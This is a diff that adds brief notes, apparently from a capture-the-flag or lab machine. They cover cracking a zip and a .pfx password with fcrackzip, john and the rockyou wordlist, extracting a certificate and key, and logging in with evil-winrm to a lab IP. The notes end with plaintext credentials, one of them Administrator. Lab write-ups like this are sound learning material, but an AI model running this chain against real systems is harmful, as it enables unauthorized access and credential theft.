@@ -1,0 +1,25 @@
+------------------
+NOTES
+------------------
+fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
+
+------------------
+PROCESS
+------------------
+smbclient to find and open share and recover a locked zip file
+	fcrackzip to recover the password - supremelegacy
+
+able to get a .pfx which we can crack a passwrod with john
+	pfx2john legacyy_dev_auth.pfx > hash
+	john -w=/usr/share/wordlists/rockyou.txt hash
+
+from the pfx file, can pull out a cert and a private key using this blog post:
+	https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/
+
+finally can authenticate using evil-winrm
+	evil-winrm -S -k key.pem -c cert.pem -i 10.129.133.175
+
+
+
+svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
+Administrator:J+3W6gCu.l1wwt/1x2mh[@Fw
